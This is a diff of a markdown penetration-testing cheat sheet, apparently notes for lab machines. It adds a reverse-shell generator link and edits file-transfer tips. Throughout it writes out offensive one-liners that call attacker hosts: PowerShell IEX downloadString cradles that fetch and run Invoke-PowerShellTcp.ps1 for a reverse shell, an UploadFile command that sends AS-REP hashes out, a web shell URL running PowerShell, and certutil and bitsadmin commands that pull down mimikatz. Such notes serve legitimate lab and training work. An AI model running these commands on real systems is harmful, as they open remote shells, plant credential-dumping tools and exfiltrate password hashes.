@@ -185,6 +185,8 @@ https://wiki.porchetta.industries/
 
 
 ### Shells and Remote access 
+[Reverse Shell Generator - Great for quickly putting together payloads](https://www.revshells.com/)
+
 [Nishang PowerShell pentesting framework (Payloads, shells, etc)](https://github.com/samratashok/nishang)
 
 [Invoke-Powershelltcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1)
@@ -197,7 +199,9 @@ https://wiki.porchetta.industries/
 ### Check if Powershell is running as 32 or 64 bit (Helpful to check if kernel exploits are failing)
 `PS C:\Users> [Environment]::Is64BitProcess` returns true/false 
 if running as 32 bit, call the powershell from `C:\windows\sysNative` instead of `C:\windows\system32` 
-Example - `C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')`  
+Example - `C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')`
+
+`powershell.exe IEX(New-Object Net.WebClient).downloadString('http://192.168.49.120:8000/Invoke-PowerShellTcp.ps1')`
 More info in writeup for [Optimum](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)
 
 ### Fix $PATH on Windows (good if whoami, certutil and other exe's are "not recognized")
@@ -255,13 +259,13 @@ Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net
 `powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1');"`
 
 ### Powershell Upload to kali - Make sure apache is running and the upload.php is there! 
-`powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.143/upload.php', 'asrep_hashes.txt')`
+`powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.143/upload.php', 'asrep_hashes.txt')` 
 
 ### Certutil transfer **HIGHLY EFFECTIVE**
 `certutil.exe -urlcache -split -f http://192.168.119.143:8000/mimikatz.exe`
 
 ### If certutil fails try bitsadmin
-`bitsadmin /transfer job /download /priority high http://192.168.245.139/nc.exe c:\\pwn\\nc.exe'`
+`bitsadmin /transfer job /download /priority high http://192.168.49.120:8001/mimikatz.exe c:\\Users\\Administrator\\mimikatz.exe'`
 
 --------------------------------------------
 # Tunneling 
